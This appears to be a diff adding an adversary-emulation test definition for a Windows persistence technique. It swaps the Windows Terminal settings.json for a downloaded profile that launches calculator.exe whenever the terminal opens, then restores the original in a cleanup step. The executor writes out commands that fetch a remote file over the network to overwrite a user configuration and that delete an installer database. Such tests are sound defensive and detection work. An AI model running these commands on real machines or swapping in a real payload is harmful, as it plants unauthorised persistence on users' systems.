@@ -1,0 +1,42 @@
+attack_technique: T1547.015
+display_name: 'Boot or Logon Autostart Execution: Login Items'
+atomic_tests:
+- name: Persistence by modifying Windows Terminal profile
+  auto_generated_guid: ec5d76ef-82fe-48da-b931-bdb25a62bc65
+  description: Modify Windows Terminal settings.json file to gain persistence. [Twitter Post](https://twitter.com/nas_bench/status/1550836225652686848)
+  supported_platforms:
+  - windows
+  input_arguments:
+    calculator:
+      description: Test program used to imitate a maliciously called program.
+      type: String
+      default: calculator.exe
+    settings_json_def:
+      description: Default file for Windows Terminal to replace the default profile with a backdoor to call another program.
+      type: Path
+      default: ~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json
+    settings_json_tmp:
+      description: Temp file for Windows Terminal.
+      type: Path
+      default: ~\AppData\Local\Temp\settings.json
+    wt_exe:
+      description: Windows Terminal executable.
+      type: Path
+      default: ~\AppData\Local\Microsoft\WindowsApps\Microsoft.WindowsTerminal_8wekyb3d8bbwe\wt.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Windows Terminal must be installed
+    prereq_command: |
+      if (Test-Path #{wt_exe}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      $(rm ~\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\LocalState\StoreEdgeFD\installed.db -ErrorAction Ignore; Write-Output ""; $?) -and $(winget install --id=Microsoft.WindowsTerminal)
+  executor:
+    command: |
+      mv #{settings_json_def} #{settings_json_tmp}
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true" -OutFile "#{settings_json_def}"
+      wt.exe
+    cleanup_command: |
+      mv -Force #{settings_json_tmp} #{settings_json_def}
+      taskkill /F /IM "#{calculator}" > $null
+    name: powershell
